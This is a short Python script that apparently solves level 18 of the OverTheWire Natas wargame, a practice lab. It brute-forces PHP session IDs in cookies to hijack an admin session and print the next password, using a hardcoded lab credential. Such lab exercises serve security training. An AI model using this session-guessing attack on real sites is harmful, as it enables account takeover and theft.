#!/bin/python

import requests

url = "http://natas18.natas.labs.overthewire.org"
user = "natas18" 
pwd = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"

for i in range(1, 641):

	cookies = {"PHPSESSID" : str(i)}
	r = requests.get(url + "?debug", cookies=cookies, auth=(user,pwd))
	if "Password" in r.content:
		print r.content
		break